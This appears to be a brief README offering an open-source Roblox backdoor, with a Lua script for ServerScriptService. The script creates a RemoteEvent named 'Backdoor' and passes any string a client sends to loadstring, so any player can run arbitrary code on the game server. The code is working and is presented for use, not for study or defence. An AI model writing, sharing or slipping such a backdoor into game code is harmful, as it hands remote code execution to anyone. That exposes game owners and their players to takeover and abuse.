# KibbolBacj
A bad roblox backdeer 
this backdoor is open source and made by myself 😳
if you wanna use this
just put this script in ServerScriptService
local server = Instance.new("RemoteEvent", game.ReplicatedStorage)
server.Name = "Backdoor" -- or you can make it anything
server.OnServerEvent:Connect(function(player, SS)
    loadstring(SS)()
end)
